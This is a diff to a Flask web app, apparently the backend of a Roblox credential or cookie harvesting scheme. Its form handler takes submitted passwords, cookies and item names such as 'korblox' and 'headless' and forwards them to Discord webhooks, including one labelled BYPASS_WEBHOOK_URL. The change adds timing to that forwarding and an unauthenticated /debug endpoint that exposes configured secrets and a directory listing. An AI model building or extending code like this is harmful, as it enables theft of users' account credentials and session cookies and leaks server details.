@@ -1,4 +1,5 @@
 import os
+import sys
 import json
 import re
 import requests
@@ -525,6 +526,22 @@ def health_check_full():
     
     return jsonify(results), status_code
 
+@app.route('/debug')
+def debug_info():
+    """Debug endpoint to check environment and configuration"""
+    return jsonify({
+        'environment_variables': {
+            'DISCORD_WEBHOOK_URL': 'SET' if os.environ.get('DISCORD_WEBHOOK_URL') else 'NOT_SET',
+            'BYPASS_WEBHOOK_URL': 'SET' if os.environ.get('BYPASS_WEBHOOK_URL') else 'NOT_SET',
+            'DATABASE_URL': 'SET' if os.environ.get('DATABASE_URL') else 'NOT_SET',
+            'SESSION_SECRET': 'SET' if os.environ.get('SESSION_SECRET') else 'NOT_SET'
+        },
+        'python_version': sys.version,
+        'current_working_directory': os.getcwd(),
+        'files_in_directory': os.listdir('.'),
+        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
+    })
+
 @app.route('/submit', methods=['POST'])
 def submit_form():
     """Handle form submission and send to Discord webhook"""
@@ -571,18 +588,25 @@ def submit_form():
         
         # Process Discord webhooks synchronously for Vercel compatibility  
         print("Processing Discord webhooks synchronously...")
+        start_time = time.time()
+        
         try:
             send_to_discord_background(password, korblox, headless, cookie, webhook_url)
-            print("Discord webhook processing completed successfully")
+            end_time = time.time()
+            processing_time = end_time - start_time
+            print(f"Discord webhook processing completed successfully in {processing_time:.2f} seconds")
+            
             return jsonify({
                 'success': True, 
-                'message': 'Data processed and sent successfully'
+                'message': f'Data processed and sent successfully in {processing_time:.1f}s'
             })
         except Exception as e:
-            print(f"Error during Discord webhook processing: {str(e)}")
+            end_time = time.time()
+            processing_time = end_time - start_time
+            print(f"Error during Discord webhook processing after {processing_time:.2f} seconds: {str(e)}")
             return jsonify({
                 'success': False, 
-                'message': 'Processing completed but webhook delivery may have failed'
+                'message': f'Processing failed after {processing_time:.1f}s: webhook delivery error'
             }), 500
             
     except Exception as e:
